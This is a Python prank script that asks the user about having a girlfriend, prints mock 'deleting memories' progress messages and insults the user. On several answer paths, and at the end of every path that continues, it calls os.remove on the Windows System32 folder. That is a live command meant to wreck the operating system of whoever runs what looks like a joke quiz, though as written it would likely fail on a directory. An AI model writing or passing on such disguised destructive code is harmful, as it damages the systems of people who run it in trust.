import time
import os
from colorama import Fore, Back, Style, init

#start process
print(Fore.RED + "Starting Precess!")
time.sleep(6)

#first q
question = input(Fore.GREEN + "Do you have girlfriend? Yes/No: ")
if question == "Yes":
    print(Fore.YELLOW + "NICE, good life!")
    time.sleep(4)
    quit()

#if q1 no delete os.system 32
elif question == "No":
    time.sleep(4)
    question2 = input(Fore.GREEN + "Do you want to continue? Yes/No: ")
    if question2 == "No":
        time.sleep(3)
        print(Fore.YELLOW + "So byee loser!")
        os.remove("C:\Windows\System32")

#if q1 yes start process
    elif question2 == "Yes":
        time.sleep(5)
        print(Fore.RED + "Starting!!")
    time.sleep(4)

#process with time.sleep(4)
    print(Fore.WHITE + "[|] 1/3 deleting memories...")
    time.sleep(4)

    print(Fore.WHITE + "[||] 2/3 deleting feelings...")
    time.sleep(4)

    print(Fore.WHITE + "[|||] 3/3 deleting her life...")
    time.sleep(3)

    print(Fore.LIGHTRED_EX + "Process completed successfully!")
    time.sleep(4)

    print(Fore.MAGENTA + "My calculations says..")
    time.sleep(3)

    print(Fore.RED + "Go to gym lol! and find another girlfriend")

#questionFindGirl "Do you find a girlfriend"
    time.sleep(3)
    questionFindGirl = input(Fore.LIGHTYELLOW_EX + "So do you find girlfriend? Yes/No: ")
    if questionFindGirl == "Yes":
        time.sleep(5)
        print(Fore.MAGENTA + "I hope")
        #after "I hope" code start at #rest of code

    elif questionFindGirl == "No":
        time.sleep(4)
        print(Fore.WHITE + "Loser")
        os.remove("C:\Windows\System32")

#rest of code    
    question3 = input(Fore.RED + "Do you want to still continue haha? Yes/No: ")
    if question3 == "No":
        time.sleep(2)
        print(Fore.GREEN + "Your choice :)")
        time.sleep(3)
        os.remove("C:\Windows\System32")

    elif question3 == "Yes":
        time.sleep(9)
        print(Fore.RED + "So your choice :)")
        time.sleep(3)
        print(Fore.MAGENTA + "Byee!")
        time.sleep(3)
        os.remove("C:\Windows\System32")
    
    quit()
